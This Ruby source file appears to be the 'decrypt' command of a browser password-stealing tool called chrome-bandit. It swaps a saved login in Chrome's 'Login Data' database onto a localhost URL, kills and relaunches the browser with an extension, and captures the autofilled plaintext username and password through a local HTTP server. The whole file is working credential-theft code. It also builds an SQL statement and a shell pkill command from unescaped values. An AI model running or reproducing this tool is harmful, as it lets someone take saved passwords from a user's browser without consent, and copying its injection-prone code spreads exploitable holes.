require_relative '../utils/http_server'

class DecryptCommand

    def initialize
        @origin_url = nil
        @fake = Tempfile.new('fake')
        @backup = "/tmp/login_data_backup_#{Time.now.to_i}.db"

        @options = {
            id: nil,
            url: nil,
            port: 5678,
            format: 'text',
            login_data: nil
        }

        parser = OptionParser.new do |opts|
            opts.banner = 'Usage: chrome-bandit decrypt [options]'
            opts.on('-x', '--port <port>', Integer, 'set HTTP server port')
            opts.on('-f', '--format <format>', String, 'set the output format: text, json')
            opts.on('-l', '--login_data <path>', String, 'set the "Login Data" file path')
            opts.on('-b', '--browser_process_name <name>', String, 'set the browser process name')
            opts.on('-p', '--browser_executable_path <path>', String, 'set the browser executable path')
            opts.on('-i', '--id <id>', Integer, 'decrypt the password for a given site id')
            opts.on('-u', '--url <url>', String, 'decrypt the password for the first match of a given url')

            for browser in BROWSERS.keys
                opts.on('--' + browser.to_s)
            end

            opts.on('-v', '--verbose')
        end

        parser.parse!(into: @options)

        @url = "http://localhost:#{@options[:port]}/"

        set_browser_defaults()

        if !@options[:login_data]
            @options[:chrome] = true
            set_browser_defaults()
        end

        if @options[:id] == nil && @options[:url] == nil
            raise '-i <id> or -u <url> option is required'
        end

        if VERBOSE
            puts "#{"Process Name:".yellow} #{@options[:browser_process_name]}"
            puts "#{"Executable Path:".yellow} #{@options[:browser_executable_path]}"
            puts "#{"Login Data:".yellow} #{@options[:login_data]}"
        end
    end

    def run
        if !@options[:login_data]
            raise 'The Login Data file path must be defined'
        end

        if !File.file? @options[:login_data]
            raise "#{@options[:login_data]} does not exists"
        end

        generate_fake_login_data()
        close_browser()

        credentials = []
        html = File.read(RESOURCES_PATH + "/index.html")
        @server_thread = start_http_server(html, @options[:port], credentials)

        FileUtils.cp(@fake.path, @options[:login_data])

        main_thread = Thread.new do
            open_browser_with_extension()

            timeout = 5
            while credentials.length == 0
                sleep 0.5
                timeout = timeout - 0.5
                if timeout <= 0
                    cleanup()
                    raise "timeout"
                end
            end

            cleanup()

            case @options[:format]
                when 'text'
                    tableprint({url: "URL", username: "Username", password: "Password"}, credentials.map { |(cred)|
                        {url: @origin_url, username: cred["username"], password: cred["password"]}
                    })
                when 'json'
                    credentials[0][:url] = @origin_url
                    puts JSON.generate(credentials[0])
            end
        end

        main_thread.join
        @server_thread.join
    end

    private

    def cleanup
        FileUtils.cp(@backup, @options[:login_data])
        File.unlink @backup
        @server_thread.kill()
        close_browser()
    end

    def set_browser_defaults
        for browser in BROWSERS.keys
            if !@options[browser]
                next
            end

            @options[:browser_executable_path] = BROWSERS[browser][:browser_executable_path]
            @options[:browser_process_name] = BROWSERS[browser][:browser_process_name]

            for file in BROWSERS[browser][:login_data_files]
                if file[0...5] == "%home"
                    file[0...5] = Dir.home
                end
                @options[:login_data] = file
                if File.file? file
                    break
                end
            end
        end
    end

    def generate_fake_login_data
        FileUtils.cp(@options[:login_data], @fake.path)
        FileUtils.cp(@options[:login_data], @backup)
        
        db = SQLite3::Database.new @fake.path

        if @options[:url] != nil
            arg = "%#{@options[:url]}%"
            sql = "SELECT origin_url, username_value, hex(password_value) FROM logins WHERE username_value != '' AND password_value != '' AND origin_url like ? limit 1;"
        else
            arg = @options[:id]
            sql = "SELECT origin_url, username_value, hex(password_value) FROM logins WHERE username_value != '' AND password_value != '' AND id = ?"
        end
        
        result = db.execute sql, arg

        if result.length == 0
            raise 'no username and password were found'
        end

        ((origin_url, username,password)) = result

        @origin_url = origin_url

        db.execute "DELETE FROM logins;"
        db.execute "INSERT INTO logins VALUES('#{@url}','#{@url}','log','#{username}','pwd',X'#{password}','','#{@url}',13088266845553919,0,0,0,163,X'00000000','','','',0,0,X'00000000',9999,13289417931746755,X'00000000',13088266845553919);"
        db.close
    end

    def close_browser
        `pkill -a -i "#{@options[:browser_process_name]}"`
        `pkill -a -i "#{@options[:browser_process_name]}"`
        sleep 0.5
    end

    def open_browser_with_extension
        pid = nil
        reader, writer = IO.pipe
        extension_path = RESOURCES_PATH + '/extension'
        cmd = "\"#{@options[:browser_executable_path]}\" --load-extension=#{extension_path} #{@url} --window-size=200,200  > /dev/null"
        pid = Process.spawn(cmd, [:out, :err] => writer)
        Process.detach(pid)
    end

end
